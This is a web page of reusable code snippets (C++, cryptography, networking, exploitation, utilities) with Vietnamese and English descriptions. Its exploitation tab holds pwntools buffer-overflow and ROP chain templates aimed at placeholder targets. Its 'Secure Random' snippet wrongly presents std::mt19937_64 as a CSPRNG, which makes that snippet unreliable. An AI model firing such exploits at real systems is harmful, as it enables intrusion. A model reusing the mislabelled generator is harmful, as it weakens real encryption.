# Code Snippets Library

<style>
.snippets-container { max-width: 1200px; margin: 20px auto; }
.category-tabs { display: flex; flex-wrap: wrap; gap: 8px; margin: 20px 0; border-bottom: 2px solid var(--md-default-fg-color--lightest); }
.cat-tab { padding: 12px 20px; border: none; background: transparent; color: var(--md-default-fg-color); cursor: pointer; font-weight: 500; border-bottom: 3px solid transparent; transition: all 0.2s; }
.cat-tab:hover { background: var(--md-code-bg-color); }
.cat-tab.active { border-bottom-color: var(--md-primary-fg-color); color: var(--md-primary-fg-color); }
.snippets-grid { display: grid; gap: 20px; margin: 20px 0; }
.snippet-card { background: var(--md-code-bg-color); border-radius: 6px; border: 1px solid var(--md-default-fg-color--lightest); overflow: hidden; }
.snippet-header { padding: 15px; border-bottom: 1px solid var(--md-default-fg-color--lightest); display: flex; justify-content: space-between; align-items: center; }
.snippet-title { font-weight: 600; font-size: 1.1em; }
.snippet-tags { display: flex; gap: 5px; flex-wrap: wrap; }
.tag { padding: 4px 10px; background: var(--md-accent-fg-color--transparent); border-radius: 12px; font-size: 0.8em; }
.snippet-code { padding: 15px; font-family: 'Consolas', monospace; font-size: 0.9em; background: var(--md-default-bg-color); overflow-x: auto; position: relative; }
.snippet-code pre { margin: 0; white-space: pre-wrap; word-break: break-word; }
.snippet-actions { padding: 12px 15px; display: flex; gap: 10px; background: var(--md-code-bg-color); border-top: 1px solid var(--md-default-fg-color--lightest); }
.action-btn { padding: 8px 15px; border: 1px solid var(--md-default-fg-color--lightest); border-radius: 4px; background: transparent; color: var(--md-default-fg-color); cursor: pointer; font-size: 0.9em; transition: all 0.2s; }
.action-btn:hover { background: var(--md-primary-fg-color); color: white; border-color: var(--md-primary-fg-color); }
.snippet-desc { padding: 12px 15px; font-size: 0.95em; opacity: 0.8; border-top: 1px solid var(--md-default-fg-color--lightest); }
.search-box { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid var(--md-default-fg-color--lightest); border-radius: 6px; background: var(--md-code-bg-color); color: var(--md-default-fg-color); font-size: 1em; }
.category-content { display: none; }
.category-content.active { display: block; }
</style>

<div class="snippets-container">
  <input type="text" class="search-box" id="searchSnippets" placeholder="🔍 Search snippets..." onkeyup="searchSnippets()">
  
  <div class="category-tabs">
    <button class="cat-tab active" onclick="switchCategory('cpp')">C++</button>
    <button class="cat-tab" onclick="switchCategory('crypto')">Cryptography</button>
    <button class="cat-tab" onclick="switchCategory('network')">Networking</button>
    <button class="cat-tab" onclick="switchCategory('exploit')">Exploitation</button>
    <button class="cat-tab" onclick="switchCategory('utils')">Utilities</button>
  </div>

  <!-- C++ Snippets -->
  <div class="category-content active" id="cpp">
    <div class="snippets-grid">
      
      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">RAII Smart Pointers</div>
          <div class="snippet-tags">
            <span class="tag">C++11</span>
            <span class="tag">Memory</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;memory&gt;

// unique_ptr - exclusive ownership
std::unique_ptr&lt;int&gt; ptr1 = std::make_unique&lt;int&gt;(42);
auto ptr2 = std::move(ptr1); // Transfer ownership

// shared_ptr - shared ownership
std::shared_ptr&lt;int&gt; sptr1 = std::make_shared&lt;int&gt;(100);
std::shared_ptr&lt;int&gt; sptr2 = sptr1; // Reference count = 2

// weak_ptr - non-owning reference
std::weak_ptr&lt;int&gt; wptr = sptr1;</pre></div>
        <div class="snippet-desc">Modern C++ memory management với smart pointers. Tránh memory leaks.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Template Metaprogramming</div>
          <div class="snippet-tags">
            <span class="tag">C++17</span>
            <span class="tag">Templates</span>
          </div>
        </div>
        <div class="snippet-code"><pre>template&lt;typename T&gt;
concept Hashable = requires(T a) {
    { std::hash&lt;T&gt;{}(a) } -&gt; std::convertible_to&lt;std::size_t&gt;;
};

template&lt;Hashable T&gt;
void process(T value) {
    std::cout &lt;&lt; std::hash&lt;T&gt;{}(value) &lt;&lt; '\n';
}

// SFINAE example
template&lt;typename T&gt;
std::enable_if_t&lt;std::is_integral_v&lt;T&gt;, T&gt;
safe_divide(T a, T b) {
    return b != 0 ? a / b : 0;
}</pre></div>
        <div class="snippet-desc">C++20 concepts và SFINAE cho type-safe templates.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Thread-Safe Singleton</div>
          <div class="snippet-tags">
            <span class="tag">C++11</span>
            <span class="tag">Thread-Safe</span>
          </div>
        </div>
        <div class="snippet-code"><pre>class Singleton {
private:
    Singleton() = default;
    ~Singleton() = default;
    
public:
    Singleton(const Singleton&) = delete;
    Singleton& operator=(const Singleton&) = delete;
    
    static Singleton& getInstance() {
        static Singleton instance; // Thread-safe in C++11
        return instance;
    }
    
    void doSomething() { /* ... */ }
};</pre></div>
        <div class="snippet-desc">Thread-safe Singleton pattern với Meyer's Singleton.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

    </div>
  </div>

  <!-- Cryptography Snippets -->
  <div class="category-content" id="crypto">
    <div class="snippets-grid">
      
      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">AES-256 Encryption (OpenSSL)</div>
          <div class="snippet-tags">
            <span class="tag">C++</span>
            <span class="tag">OpenSSL</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;openssl/evp.h&gt;
#include &lt;openssl/aes.h&gt;

std::vector&lt;uint8_t&gt; aes_encrypt(
    const std::vector&lt;uint8_t&gt;& plaintext,
    const uint8_t* key, const uint8_t* iv) {
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv);
    
    std::vector&lt;uint8_t&gt; ciphertext(plaintext.size() + AES_BLOCK_SIZE);
    int len, ciphertext_len;
    
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, 
                      plaintext.data(), plaintext.size());
    ciphertext_len = len;
    
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);
    return ciphertext;
}</pre></div>
        <div class="snippet-desc">AES-256-CBC encryption với OpenSSL. Nhớ thêm authentication (HMAC).</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">RSA Key Generation</div>
          <div class="snippet-tags">
            <span class="tag">C++</span>
            <span class="tag">OpenSSL</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;openssl/rsa.h&gt;
#include &lt;openssl/pem.h&gt;

RSA* generate_rsa_keypair(int bits = 2048) {
    BIGNUM* bne = BN_new();
    BN_set_word(bne, RSA_F4); // 65537
    
    RSA* rsa = RSA_new();
    RSA_generate_key_ex(rsa, bits, bne, nullptr);
    
    BN_free(bne);
    return rsa;
}

void save_keys(RSA* rsa) {
    BIO* pri = BIO_new_file("private.pem", "w");
    BIO* pub = BIO_new_file("public.pem", "w");
    
    PEM_write_bio_RSAPrivateKey(pri, rsa, nullptr, nullptr, 0, nullptr, nullptr);
    PEM_write_bio_RSAPublicKey(pub, rsa);
    
    BIO_free_all(pri);
    BIO_free_all(pub);
}</pre></div>
        <div class="snippet-desc">Generate RSA 2048-bit keypair và save to PEM files.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Secure Random Number Generator</div>
          <div class="snippet-tags">
            <span class="tag">C++11</span>
            <span class="tag">Crypto</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;random&gt;

class SecureRandom {
    std::random_device rd;
    std::mt19937_64 gen;
    
public:
    SecureRandom() : gen(rd()) {}
    
    uint64_t next() {
        return gen();
    }
    
    std::vector&lt;uint8_t&gt; bytes(size_t n) {
        std::vector&lt;uint8_t&gt; result(n);
        for (auto& b : result) {
            b = static_cast&lt;uint8_t&gt;(gen() & 0xFF);
        }
        return result;
    }
};</pre></div>
        <div class="snippet-desc">CSPRNG cho cryptographic applications. Dùng std::random_device.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

    </div>
  </div>

  <!-- Network Snippets -->
  <div class="category-content" id="network">
    <div class="snippets-grid">
      
      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">TCP Socket Server</div>
          <div class="snippet-tags">
            <span class="tag">C++</span>
            <span class="tag">POSIX</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;

int create_server(int port) {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    
    bind(server_fd, (sockaddr*)&address, sizeof(address));
    listen(server_fd, 10);
    
    return server_fd;
}

void handle_client(int client_fd) {
    char buffer[1024] = {0};
    read(client_fd, buffer, sizeof(buffer));
    send(client_fd, "HTTP/1.1 200 OK\r\n\r\nHello", 25, 0);
    close(client_fd);
}</pre></div>
        <div class="snippet-desc">Basic TCP server với POSIX sockets. Production cần error handling.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Raw Socket - Packet Sniffer</div>
          <div class="snippet-tags">
            <span class="tag">C</span>
            <span class="tag">Linux</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;sys/socket.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/tcp.h&gt;

int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    return sock;
}

void sniff_packets(int sock) {
    char buffer[65536];
    while (true) {
        int data_size = recvfrom(sock, buffer, sizeof(buffer), 0, nullptr, nullptr);
        
        iphdr* ip = (iphdr*)buffer;
        tcphdr* tcp = (tcphdr*)(buffer + ip->ihl * 4);
        
        printf("TCP %s:%d -> ", inet_ntoa({ip->saddr}), ntohs(tcp->source));
        printf("%s:%d\n", inet_ntoa({ip->daddr}), ntohs(tcp->dest));
    }
}</pre></div>
        <div class="snippet-desc">Raw socket để capture packets. Cần root privileges.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

    </div>
  </div>

  <!-- Exploitation Snippets -->
  <div class="category-content" id="exploit">
    <div class="snippets-grid">
      
      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Buffer Overflow Pattern</div>
          <div class="snippet-tags">
            <span class="tag">Python</span>
            <span class="tag">Exploit</span>
          </div>
        </div>
        <div class="snippet-code"><pre>from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)

# Find offset
offset = cyclic_find(0x61616162)  # From crashed RIP
print(f"Offset: {offset}")

# Build exploit
payload = flat(
    b'A' * offset,
    p64(0xdeadbeef),  # Return address
    p64(0xcafebabe)   # Additional data
)

# Send exploit
p = remote('target.com', 1337)
p.sendline(payload)
p.interactive()</pre></div>
        <div class="snippet-desc">Buffer overflow exploitation pattern với pwntools.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">ROP Chain Builder</div>
          <div class="snippet-tags">
            <span class="tag">Python</span>
            <span class="tag">ROP</span>
          </div>
        </div>
        <div class="snippet-code"><pre>from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Build ROP chain
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = flat(
    b'A' * 72,
    rop.chain()
)

# Alternative: manual ROP
pop_rdi = 0x401234
ret = 0x401000

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])</pre></div>
        <div class="snippet-desc">ROP chain construction để bypass NX protection.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

    </div>
  </div>

  <!-- Utilities Snippets -->
  <div class="category-content" id="utils">
    <div class="snippets-grid">
      
      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Logger Class</div>
          <div class="snippet-tags">
            <span class="tag">C++17</span>
            <span class="tag">Utility</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;chrono&gt;
#include &lt;iomanip&gt;

enum LogLevel { DEBUG, INFO, WARN, ERROR };

class Logger {
    std::ofstream file;
    LogLevel min_level = INFO;
    
public:
    Logger(const std::string& filename) : file(filename, std::ios::app) {}
    
    template&lt;typename... Args&gt;
    void log(LogLevel level, Args&&... args) {
        if (level < min_level) return;
        
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        
        file &lt;&lt; std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S") &lt;&lt; " ";
        file &lt;&lt; level_str(level) &lt;&lt; " ";
        (file &lt;&lt; ... &lt;&lt; args) &lt;&lt; '\n';
    }
    
private:
    const char* level_str(LogLevel l) {
        switch(l) {
            case DEBUG: return "[DEBUG]";
            case INFO:  return "[INFO]";
            case WARN:  return "[WARN]";
            case ERROR: return "[ERROR]";
        }
    }
};</pre></div>
        <div class="snippet-desc">Simple logging class với timestamps và log levels.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

      <div class="snippet-card">
        <div class="snippet-header">
          <div class="snippet-title">Argument Parser</div>
          <div class="snippet-tags">
            <span class="tag">C++</span>
            <span class="tag">CLI</span>
          </div>
        </div>
        <div class="snippet-code"><pre>#include &lt;map&gt;
#include &lt;string&gt;
#include &lt;optional&gt;

class ArgParser {
    std::map&lt;std::string, std::string&gt; args;
    
public:
    ArgParser(int argc, char* argv[]) {
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg.starts_with("--")) {
                auto pos = arg.find('=');
                if (pos != std::string::npos) {
                    args[arg.substr(2, pos-2)] = arg.substr(pos+1);
                } else {
                    args[arg.substr(2)] = "true";
                }
            }
        }
    }
    
    std::optional&lt;std::string&gt; get(const std::string& key) {
        auto it = args.find(key);
        return it != args.end() ? std::make_optional(it->second) : std::nullopt;
    }
    
    bool has(const std::string& key) {
        return args.count(key) > 0;
    }
};</pre></div>
        <div class="snippet-desc">Simple command-line argument parser cho C++ programs.</div>
        <div class="snippet-actions">
          <button class="action-btn" onclick="copySnippet(this)">📋 Copy</button>
        </div>
      </div>

    </div>
  </div>
</div>

<script>
function switchCategory(cat) {
  document.querySelectorAll('.cat-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.category-content').forEach(c => c.classList.remove('active'));
  event.target.classList.add('active');
  document.getElementById(cat).classList.add('active');
}

function copySnippet(btn) {
  const code = btn.closest('.snippet-card').querySelector('pre').textContent;
  navigator.clipboard.writeText(code).then(() => {
    const original = btn.textContent;
    btn.textContent = '✓ Copied!';
    setTimeout(() => btn.textContent = original, 1500);
  });
}

function searchSnippets() {
  const query = document.getElementById('searchSnippets').value.toLowerCase();
  const cards = document.querySelectorAll('.snippet-card');
  
  cards.forEach(card => {
    const text = card.textContent.toLowerCase();
    card.style.display = text.includes(query) ? 'block' : 'none';
  });
}
</script>